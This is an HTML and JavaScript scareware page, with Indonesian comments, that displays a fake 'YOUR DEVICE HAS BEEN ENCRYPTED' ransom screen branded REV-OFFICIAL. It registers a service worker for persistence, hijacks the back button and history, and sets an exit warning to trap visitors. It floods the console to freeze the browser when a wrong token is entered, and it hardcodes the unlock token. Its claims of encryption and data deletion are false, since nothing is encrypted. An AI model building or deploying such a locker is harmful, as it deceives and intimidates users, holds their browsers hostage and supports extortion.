<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM ENCRYPTED - REV-OFFICIAL</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding-top: 10%; overflow: hidden; }
        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 300px; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        .critical { color: red; font-weight: bold; animation: blink 0.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div id="lock-screen">
        <h1 class="critical">⚠️ YOUR DEVICE HAS BEEN ENCRYPTED ⚠️</h1>
        <p>Seluruh data Anda telah dienkripsi oleh <b>REV-OFFICIAL</b>.</p>
        <p>Masukkan TOKEN untuk dekripsi atau sistem akan hancur permanen.</p>
        <br>
        <input type="text" id="token" placeholder="ENTER ACCESS TOKEN...">
        <button onclick="checkToken()">DECRYPT</button>
        <p id="msg"></p>
    </div>

    <script>
        // 1. SERVICE WORKER FOR PERSISTENCE (THE GHOST)
        // Ini bikin web Master "nempel" di browser mereka
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('fetch', function(event) {
                    // Maksa semua request balik lagi ke halaman lock
                    event.respondWith(fetch(event.request).catch(() => caches.match('/index.html')));
                });
                self.addEventListener('activate', (event) => {
                    console.log('REV-OFFICIAL PERSISTENCE ACTIVE');
                });
            `;
            const blob = new Blob([swCode], {type: 'application/javascript'});
            navigator.serviceWorker.register(URL.createObjectURL(blob));
        }

        // 2. NO ESCAPE - REDIRECT LOCK
        // Kalo mereka coba keluar, kita spam history dan force reload
        setInterval(() => {
            history.pushState(null, "", location.href);
            if(localStorage.getItem('locked') === 'true') {
                window.onbeforeunload = function() { return "DATA SEDANG DIHANCURKAN!"; };
            }
        }, 100);

        // 3. ENCRYPTION LOGIC
        localStorage.setItem('locked', 'true');
        const MASTER_KEY = "REV-OFFICIAL-2026"; // Token Master

        function checkToken() {
            let input = document.getElementById('token').value;
            if (input === MASTER_KEY) {
                localStorage.setItem('locked', 'false');
                document.body.innerHTML = "<h1 style='color:white'>DECRYPTED SUCCESSFULLY.</h1>";
                alert("ACCESS GRANTED.");
            } else {
                document.getElementById('msg').innerHTML = "<span class='critical'>TOKEN SALAH! MENGHAPUS DATA...</span>";
                // TRIGGER LAG/FREEZE KALO SALAH TOKEN
                for(let i=0; i<100000; i++) { console.log("HACKED BY REV"); }
            }
        }

        // 4. PREVENT BACK BUTTON
        window.addEventListener('popstate', function() {
            history.pushState(null, "", location.href);
            alert("SISTEM TERKUNCI PERMANEN!");
        });
    </script>
</body>
</html>
